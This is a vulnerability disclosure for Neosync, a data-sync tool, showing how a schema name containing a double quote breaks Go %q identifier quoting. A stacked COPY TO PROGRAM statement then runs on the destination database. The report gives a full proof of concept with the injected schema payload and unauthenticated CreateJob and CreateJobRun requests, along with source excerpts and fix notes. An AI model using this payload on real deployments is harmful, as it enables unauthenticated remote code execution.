### Vulnerability details

**Official website / Product:** https://www.neosync.dev / https://github.com/nucleuscloud/neosync

**Repository:** nucleuscloud/neosync (stars at selection: 4128; repository archived)

**Vulnerability type:** RCE (PostgreSQL identifier quoting bug via Go `%q` in schema-init → stacked `COPY TO PROGRAM`)

**Vulnerability versions:** Docker `ghcr.io/nucleuscloud/neosync/api:latest` label `0.5.41` (OCI revision `4a2c971c81b098ec8cb6661a1b7883f1f56b40f3`); source reviewed at `8101c42dcdb0ac6f67558d4fabb41fefad97a101` (archived `main`). Sink `fmt.Sprintf("CREATE SCHEMA IF NOT EXISTS %q;", schema)` present in `backend/pkg/sqlmanager/postgres/postgres-manager.go`.

**Vulnerability URL / Parameter:** `POST /mgmt.v1alpha1.JobService/CreateJob` — JSON fields `mappings[].schema` / `source.options.postgres.schemas[].schema` (attacker-controlled schema identifier). Execution on destination during schema init after `POST /mgmt.v1alpha1.JobService/CreateJobRun`. Default compose ships `AUTH_ENABLED=false`.

**Complex:** yes

### Verification procedure

Lab topology (upstream seed: repo `scripts/seed-neosync.sql`). Original tree `labs/neosync-r23a1/` and lab images were removed; verified API at `http://127.0.0.1:20301` with `AUTH_ENABLED=false`. Reconstruct from upstream as follows:

- Source: `git clone https://github.com/nucleuscloud/neosync.git && git checkout 8101c42dcdb0ac6f67558d4fabb41fefad97a101`
- Compose: repo-root `compose.yml` (`include` `compose/temporal/compose.yml` + `compose/compose-db.yml`); map `api` ports to **`20301:8080`** (matches PoC `Host`)
- Images: `ghcr.io/nucleuscloud/neosync/api:0.5.41` (or `api:latest` label `0.5.41`), matching `worker`, `temporalio/auto-setup:1.26.2`, `postgres:15`, `redis:7.2.4`
- Upstream container names: `neosync-api`, `neosync-worker`, `test-prod-db` (source), `test-stage-db` (destination), `neosync-db`, `neosync-redis`, `temporal`, `neosync-api-seed`, etc. (original lab used `neosync-r23a1-*` prefix; same roles)
- `AUTH_ENABLED=false` (compose default; no login)
- Source/destination Postgres: `postgres` / `postgres` (seed URLs `postgres://postgres:postgres@test-prod-db|test-stage-db:5432/postgres?sslmode=disable`)
- **api-seed UUIDs** (`scripts/seed-neosync.sql`; must match PoC bodies):
  - `accountId` = `43c71652-b3f7-4dbb-87c2-508075496054` (personal)
  - source connection `test-prod-db` = `e53ff29d-f079-4a4d-8db5-359fe480e740`
  - destination connection `test-stage-db` = `3c592989-c672-46ea-b709-2e338cd1daff`
- After bring-up expect: `api` / `worker` / `temporal` healthy, `api-seed` exit 0 writing the UUIDs above

1. Bring up the lab (upstream compose; API on 20301):

```bash
git clone https://github.com/nucleuscloud/neosync.git
cd neosync && git checkout 8101c42dcdb0ac6f67558d4fabb41fefad97a101
# set api ports in compose.yml to "20301:8080" (or keep 8080 and adjust PoC Host)
docker compose up -d
# wait for api / worker / temporal healthy; api-seed runs scripts/seed-neosync.sql for the UUIDs above
```

2. On source Postgres `test-prod-db` (original lab: `neosync-r23a1-prod`) create a schema whose name contains a double-quote and a stacked `COPY TO PROGRAM` payload (PG identifier max 63 bytes; this payload is 44 bytes), plus table `evil` (columns `id`/`note`, matching mappings):

```bash
docker exec -i test-prod-db psql -U postgres -d postgres <<'SQL'
CREATE SCHEMA "x"";COPY (SELECT 1) TO PROGRAM 'id>/tmp/r';--";
CREATE TABLE "x"";COPY (SELECT 1) TO PROGRAM 'id>/tmp/r';--".evil (
  id serial PRIMARY KEY,
  note text
);
SQL
```

3. (Optional) `POST /mgmt.v1alpha1.UserAccountService/SetPersonalAccount` with body `{"accountId":"43c71652-b3f7-4dbb-87c2-508075496054"}`. In this lab the CreateJob body already carries the same `accountId`, and api-seed associates anonymous user `00000000-0000-0000-0000-000000000000`; CreateJob succeeded with no auth headers.

4. `POST /mgmt.v1alpha1.JobService/CreateJob` with `initTableSchema: true`, destination = stage, and `mappings` / `source.options.postgres.schemas` using that schema name (full message below).

5. `POST /mgmt.v1alpha1.JobService/CreateJobRun` with the new `jobId`.

6. Worker `RunSqlInitTableStatements` → `PostgresSchemaManager.InitializeSchema` builds `CREATE SCHEMA IF NOT EXISTS %q` and `BatchExec`s it on the destination. Go `%q` emits `\"`, which breaks PostgreSQL quoted-identifier parsing and runs the stacked `COPY ... TO PROGRAM`.

7. Confirm the RCE marker on the destination container (upstream name `test-stage-db`; original lab: `neosync-r23a1-stage`):

```bash
docker exec test-stage-db sh -c 'cat /tmp/r; echo ====; ls -l /tmp/r'
# expected output:
# uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
# ====
# -rw------- 1 postgres postgres 71 Nov  1 21:02 /tmp/r
```

8. Optional (before or after trigger): `GetConnectionInitStatements` returns the same broken SQL in the `schemas` block (full messages below).

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /mgmt.v1alpha1.JobService/CreateJob HTTP/1.1
Host: 127.0.0.1:20301
Content-Type: application/json
Content-Length: 875
Connection: close

{"accountId": "43c71652-b3f7-4dbb-87c2-508075496054", "jobName": "r23a1-schema-sqli-rce", "source": {"options": {"postgres": {"connectionId": "e53ff29d-f079-4a4d-8db5-359fe480e740", "schemas": [{"schema": "x\";COPY (SELECT 1) TO PROGRAM 'id>/tmp/r';--", "tables": [{"table": "evil"}]}], "subsetByForeignKeyConstraints": false}}}, "destinations": [{"connectionId": "3c592989-c672-46ea-b709-2e338cd1daff", "options": {"postgresOptions": {"initTableSchema": true, "truncateTable": {"truncateBeforeInsert": false, "cascade": false}, "onConflict": {"nothing": {}}}}}], "mappings": [{"schema": "x\";COPY (SELECT 1) TO PROGRAM 'id>/tmp/r';--", "table": "evil", "column": "id", "transformer": {"config": {"passthroughConfig": {}}}}, {"schema": "x\";COPY (SELECT 1) TO PROGRAM 'id>/tmp/r';--", "table": "evil", "column": "note", "transformer": {"config": {"passthroughConfig": {}}}}]}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Accept-Encoding: gzip
Content-Type: application/json
Date: Sun, 01 Nov 2026 21:02:19 GMT
Content-Length: 1186
Connection: close

{"job":{"id":"0dff5908-64f7-4150-a34d-68ee5723e586","createdByUserId":"00000000-0000-0000-0000-000000000000","createdAt":"2026-11-01T21:02:19.525938Z","updatedByUserId":"00000000-0000-0000-0000-000000000000","updatedAt":"2026-11-01T21:02:19.525938Z","name":"r23a1-schema-sqli-rce","source":{"options":{"postgres":{"schemas":[{"schema":"x\";COPY (SELECT 1) TO PROGRAM 'id>/tmp/r';--","tables":[{"table":"evil"}]}],"connectionId":"e53ff29d-f079-4a4d-8db5-359fe480e740"}}},"destinations":[{"connectionId":"3c592989-c672-46ea-b709-2e338cd1daff","options":{"postgresOptions":{"truncateTable":{},"initTableSchema":true,"onConflict":{"nothing":{}}}},"id":"8a8d2e0e-0905-4be7-8f94-aac62983121c"}],"mappings":[{"schema":"x\";COPY (SELECT 1) TO PROGRAM 'id>/tmp/r';--","table":"evil","column":"id","transformer":{"config":{"passthroughConfig":{}}}},{"schema":"x\";COPY (SELECT 1) TO PROGRAM 'id>/tmp/r';--","table":"evil","column":"note","transformer":{"config":{"passthroughConfig":{}}}}],"cronSchedule":"0 0 1 1 *","accountId":"43c71652-b3f7-4dbb-87c2-508075496054","syncOptions":{},"workflowOptions":{},"jobType":{}}}
```

Trigger request (schema-init execution):

```http
POST /mgmt.v1alpha1.JobService/CreateJobRun HTTP/1.1
Host: 127.0.0.1:20301
Content-Type: application/json
Content-Length: 49
Connection: close

{"jobId": "0dff5908-64f7-4150-a34d-68ee5723e586"}
```

Trigger response:

```http
HTTP/1.1 200 OK
Accept-Encoding: gzip
Content-Type: application/json
Date: Sun, 01 Nov 2026 21:03:06 GMT
Content-Length: 2
Connection: close

{}
```

Optional — preview broken DDL (`connectionId` is the source; response is the init SQL that will run on the destination):

```http
POST /mgmt.v1alpha1.ConnectionDataService/GetConnectionInitStatements HTTP/1.1
Host: 127.0.0.1:20301
Content-Type: application/json
Content-Length: 89
Connection: close

{"connectionId": "e53ff29d-f079-4a4d-8db5-359fe480e740", "options": {"initSchema": true}}
```

`schemas` block from the response (decoded critical statements proving `%q` emitted `\"`; same response also includes extensions / create table blocks that show the same broken quoting):

```json
{
  "label": "schemas",
  "statements": [
    "CREATE SCHEMA IF NOT EXISTS \"public\";",
    "CREATE SCHEMA IF NOT EXISTS \"x\\\";COPY (SELECT 1) TO PROGRAM 'id>/tmp/r';--\";"
  ]
}
```

I.e. the statement sent to Postgres looks like:

`CREATE SCHEMA IF NOT EXISTS "x\";COPY (SELECT 1) TO PROGRAM 'id>/tmp/r';--;";`

Verification result notes:

- CreateJob returned HTTP 200 and job id `0dff5908-64f7-4150-a34d-68ee5723e586`.
- CreateJobRun returned HTTP 200 `{}`.
- Worker log: `[schemas] found 1 statements to execute during schema initialization` then RCE file appeared on stage.
- Impact file `/tmp/r` on `test-stage-db` (original lab container name `neosync-r23a1-stage`):
```
uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
====
-rw------- 1 postgres postgres 71 Nov  1 21:02 /tmp/r
```
- Same class of unsafe quoting also exists for MySQL `` CREATE SCHEMA IF NOT EXISTS `%s` `` and MSSQL `DBCC CHECKIDENT ('%s.%s', RESEED)` (not separately counted here).

### Vulnerability analysis

Neosync schema initialization collects unique schema names from job mappings / source metadata and builds:

`CREATE SCHEMA IF NOT EXISTS %q;`

using Go’s `fmt.Sprintf` `%q` verb. `%q` produces a double-quoted Go string literal with backslash escapes (`\"`). PostgreSQL identifiers only escape embedded `"` by doubling (`""`); a backslash is a literal character and does **not** escape the closing quote. Therefore a schema name containing `"` terminates the identifier early and the remainder is parsed as new SQL.

`PostgresManager.BatchExec` joins statements with newlines and runs them via `database/sql` `ExecContext` (simple query protocol), so stacked statements such as `COPY (SELECT 1) TO PROGRAM '...'` execute as the destination Postgres OS user when that role is superuser (default `postgres` image user).

Attacker requirements: ability to create/update a sync job with `initTableSchema` (default self-hosted `AUTH_ENABLED=false` makes this unauthenticated) and either (a) a source database object whose schema name contains `"`, or (b) job mapping `schema` set to such a value when init still uses mapping schemas. In this lab both the source object and the job mapping carried the payload name.

### Trigger / sink source (full path and line numbers)

```go
# File: backend/pkg/sqlmanager/postgres/postgres-manager.go
# Lines: 1084-1090
	errgrp.Go(func() error {
		for schema := range uniqueSchemas {
			schemaStmts = append(
				schemaStmts,
				fmt.Sprintf("CREATE SCHEMA IF NOT EXISTS %q;", schema),
			)
		}
		return nil
	})
```

```go
# File: backend/pkg/sqlmanager/postgres/postgres-manager.go
# Lines: 1191-1214 (BatchExec — stacked simple-protocol execution)
func (p *PostgresManager) BatchExec(
	ctx context.Context,
	batchSize int,
	statements []string,
	opts *sqlmanager_shared.BatchExecOpts,
) error {
	for i := 0; i < len(statements); i += batchSize {
		end := i + batchSize
		if end > len(statements) {
			end = len(statements)
		}
		batchCmd := strings.Join(statements[i:end], "\n")
		// ...
		_, err := p.db.ExecContext(ctx, batchCmd)
```

```go
# File: internal/schema-manager/postgres/postgres.go
# Lines: 555-577 (InitializeSchema → destination BatchExec)
func (d *PostgresSchemaManager) InitializeSchema(...) ([]*shared.InitSchemaError, error) {
	// ...
	initblocks, err := d.sourcedb.Db().GetSchemaInitStatements(ctx, tables)
	for _, block := range initblocks {
		d.logger.Info(fmt.Sprintf("[%s] found %d statements to execute during schema initialization", block.Label, len(block.Statements)))
		err = d.destdb.Db().BatchExec(ctx, shared.BatchSizeConst, block.Statements, &sqlmanager_shared.BatchExecOpts{})
```

Execution path: `CreateJobRun` → worker `RunSqlInitTableStatements` → `InitializeSchema` → `GetSchemaInitStatements` (`%q`) → destination `BatchExec`.

### Fix notes

- Quote PostgreSQL identifiers with a dedicated helper that doubles internal `"` (e.g. `pgx.Identifier.Sanitize()` / `pq.QuoteIdentifier`), never Go `%q`.
- Prefer parameterized/`Identifier` APIs; reject schema/table names containing dangerous characters if product policy allows.
- Apply the same fix to MySQL backtick quoting and MSSQL `DBCC CHECKIDENT` string formatting.
- Consider disabling `COPY TO PROGRAM` / restricting destination roles (defense in depth; does not fix the SQLi).

